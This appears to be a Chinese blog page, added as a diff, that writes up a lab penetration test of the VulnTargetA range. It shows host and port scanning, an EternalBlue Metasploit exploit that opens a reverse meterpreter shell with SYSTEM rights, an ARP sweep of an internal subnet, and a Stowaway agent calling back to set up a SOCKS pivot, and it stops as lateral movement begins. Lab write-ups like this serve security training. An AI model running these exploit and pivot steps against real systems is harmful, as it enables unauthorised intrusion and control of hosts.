@@ -1,0 +1,388 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>打靶记录(一六五)之VulnTargetA | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="搭建参考: https:&#x2F;&#x2F;www.cnblogs.com&#x2F;backlion&#x2F;p&#x2F;16979674.html 外网打点主机发现┌──(mikannse㉿kali)-[~]└─$ sudo nmap -sn 192.168.127.0&#x2F;24[sudo] password for mikannse: Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶记录(一六五)之VulnTargetA">
+<meta property="og:url" content="http://mikannse.space/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="搭建参考: https:&#x2F;&#x2F;www.cnblogs.com&#x2F;backlion&#x2F;p&#x2F;16979674.html 外网打点主机发现┌──(mikannse㉿kali)-[~]└─$ sudo nmap -sn 192.168.127.0&#x2F;24[sudo] password for mikannse: Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-11-20T15:31:29.000Z">
+<meta property="article:modified_time" content="2024-11-20T15:32:41.707Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="windows">
+<meta property="article:tag" content="Domain">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '打靶记录(一六五)之VulnTargetA',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-11-20 23:32:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">304</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">打靶记录(一六五)之VulnTargetA</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-20T15:31:29.000Z" title="发表于 2024-11-20 23:31:29">2024-11-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-20T15:32:41.707Z" title="更新于 2024-11-20 23:32:41">2024-11-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="打靶记录(一六五)之VulnTargetA"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p>参考: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/16979674.html">https://www.cnblogs.com/backlion/p/16979674.html</a></p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sn 192.168.127.0/24</span><br><span class="line">[sudo] password <span class="keyword">for</span> mikannse: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 13:11 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.127.1</span><br><span class="line">Host is up (0.00069s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.127.3</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">MAC Address: 00:0C:29:B3:DB:08 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.127.254</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">MAC Address: 00:50:56:F1:28:E7 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.127.4</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 28.09 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<p>靶机IP为192.168.127.3</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ sudo ./fscan_386 -h 192.168.127.3            </span><br><span class="line">[sudo] password <span class="keyword">for</span> mikannse: </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">'__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 192.168.127.3   is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 1</span></span><br><span class="line"><span class="string">192.168.127.3:135 open</span></span><br><span class="line"><span class="string">192.168.127.3:445 open</span></span><br><span class="line"><span class="string">192.168.127.3:139 open</span></span><br><span class="line"><span class="string">192.168.127.3:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 4</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo:</span></span><br><span class="line"><span class="string">[*]192.168.127.3</span></span><br><span class="line"><span class="string">   [-&gt;]win7-PC</span></span><br><span class="line"><span class="string">   [-&gt;]10.0.20.98</span></span><br><span class="line"><span class="string">   [-&gt;]192.168.127.3</span></span><br><span class="line"><span class="string">[+] 192.168.127.3       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span></span><br><span class="line"><span class="string">[*] WebTitle: http://192.168.127.3      code:200 len:10065  title:通达OA网络智能办公系统</span></span><br><span class="line"><span class="string">[+] InfoScan:http://192.168.127.3      [通达OA] </span></span><br><span class="line"><span class="string">[+] http://192.168.127.3 tongda-user-session-disclosure </span></span><br><span class="line"><span class="string">已完成 4/4</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 8.185780028s</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17_010"></a>MS17_010</h2><p>发现是一个永恒之蓝，直接msf一把梭</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ msfconsole -q                         </span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/do</span><br><span class="line">                                             cs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT          445              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use <span class="keyword">for</span> authenticatio</span><br><span class="line">                                             n. Only affects Windows Server 2008 R2, Windows 7, Win</span><br><span class="line">                                             dows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote architecture matches exploit Target. O</span><br><span class="line">                                             nly affects Windows Server 2008 R2, Windows 7, Windows</span><br><span class="line">                                              Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote OS matches exploit Target. Only affect</span><br><span class="line">                                             s Windows Server 2008 R2, Windows 7, Windows Embedded</span><br><span class="line">                                             Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.233.6    <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhosts 192.168.127.3</span><br><span class="line">rhosts =&gt; 192.168.127.3</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> lhost 192.168.127.4</span><br><span class="line">lhost =&gt; 192.168.127.4</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.127.4:4444 </span><br><span class="line">[*] 192.168.127.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.127.3:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.127.3:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.127.3:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.127.3:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.127.3:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.127.3:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.127.3:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 192.168.127.3:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 192.168.127.3:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 192.168.127.3:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 192.168.127.3:445 - Target <span class="built_in">arch</span> selected valid <span class="keyword">for</span> <span class="built_in">arch</span> indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.127.3:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.127.3:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.127.3:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.127.3:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.127.3:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.127.3:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.127.3:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.127.3:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.127.3:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.127.3:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.127.3:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.127.3</span><br><span class="line">[+] 192.168.127.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.127.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.127.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.127.4:4444 -&gt; 192.168.127.3:49515) at 2024-11-20 13:19:51 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN7-PC</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br></pre></td></tr></tbody></table></figure>
+
+<p>上传一个fscan</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; upload fscan64.exe C:\\Windows\\Temp</span><br><span class="line">[*] Uploading  : /home/mikannse/vulntarget/a/fscan64.exe -&gt; C:\Windows\Temp\fscan64.exe</span><br><span class="line">[*] Completed  : /home/mikannse/vulntarget/a/fscan64.exe -&gt; C:\Windows\Temp\fscan64.exe</span><br></pre></td></tr></tbody></table></figure>
+
+<p>解决一下msf的shell中中文乱码的问题</p>
+<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">1012</span> created.</span><br><span class="line">Channel <span class="number">3</span> created.</span><br><span class="line">Microsoft Windows [�汾 <span class="number">6</span>.<span class="number">1</span>.<span class="number">7601</span>]</span><br><span class="line">��Ȩ���� (c) <span class="number">2009</span> Microsoft Corporation����������Ȩ����</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">chcp</span> 65001</span></span><br><span class="line"><span class="function"><span class="title">chcp</span> 65001</span></span><br><span class="line"><span class="function"><span class="title">Active</span> <span class="title">code</span> <span class="title">page</span>: 65001</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>&gt;<span class="title">whoami</span> /<span class="title">all</span></span></span><br><span class="line"><span class="function"><span class="title">whoami</span> /<span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">USER</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Name</span>           <span class="title">SID</span>     </span></span><br><span class="line"><span class="function">=================== ========</span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span> <span class="title">S</span>-1-5-18</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>已是系统管理员权限</p>
+<p>发现还有一张网卡</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::c43b:d6b:2f4f:6b6d%13</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.20.98</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么对这个网段进行一个主机探测,发现还有一个.99</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">bg</span></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/windows/gather/arp_scanner</span><br><span class="line">msf6 post(windows/gather/arp_scanner) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/arp_scanner) &gt; <span class="built_in">set</span> rhosts 10.0.20.1-254</span><br><span class="line">rhosts =&gt; 10.0.20.1-254</span><br><span class="line">msf6 post(windows/gather/arp_scanner) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] ARP Scanning 10.0.20.1-254</span><br><span class="line">[+]     IP: 10.0.20.1 MAC 00:50:56:c0:00:03 (VMware, Inc.)</span><br><span class="line">[+]     IP: 10.0.20.98 MAC 00:0c:29:b3:db:12 (VMware, Inc.)</span><br><span class="line">[+]     IP: 10.0.20.99 MAC 00:0c:29:49:db:32 (VMware, Inc.)</span><br><span class="line">[+]     IP: 10.0.20.254 MAC 00:50:56:ee:90:e7 (VMware, Inc.)</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></tbody></table></figure>
+
+<p>尝试一下stowaway这个新工具进行代理，先开启服务端</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/vulntarget/a]</span><br><span class="line">└─$ ./linux_x64_admin -l 9999</span><br></pre></td></tr></tbody></table></figure>
+
+<p>上传一个客户端至靶机上连接回服务端</p>
+<figure class="highlight cmd"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">Temp</span>&gt;<span class="title">windows_x64_agent.exe</span> -<span class="title">c</span> 192.168.127.4:9999</span></span><br><span class="line"><span class="function"><span class="title">windows_x64_agent.exe</span> -<span class="title">c</span> 192.168.127.4:9999</span></span><br><span class="line"><span class="function">2024/11/20 13:57:39 [*] <span class="title">Starting</span> <span class="title">agent</span> <span class="title">node</span> <span class="title">actively.Connecting</span> <span class="title">to</span> 192.168.127.4:9999</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在本地开启8888端口作为代理</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[*] Waiting <span class="keyword">for</span> new connection...</span><br><span class="line">[*] Connection from node 192.168.127.3:50432 is <span class="built_in">set</span> up successfully! Node <span class="built_in">id</span> is 0</span><br><span class="line">(admin) &gt;&gt; detail</span><br><span class="line">Node[0] -&gt; IP: 192.168.127.3:50432  Hostname: win7-PC  User: nt authority\system</span><br><span class="line">Memo: </span><br><span class="line"></span><br><span class="line">(admin) &gt;&gt; use 0</span><br><span class="line">(node 0) &gt;&gt; socks 8888</span><br><span class="line">[*] Trying to listen on 0.0.0.0:8888......</span><br><span class="line">[*] Waiting <span class="keyword">for</span> agent<span class="string">'s response......                                                               </span></span><br><span class="line"><span class="string">[*] Socks start successfully!</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>proxychains中的配置文件更改之后，即可进行代理</p>
+<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>先进行一个端口扫描，由于这种套着代理的扫描不是很稳定，总之先后扫描出一个80一个6379</p>
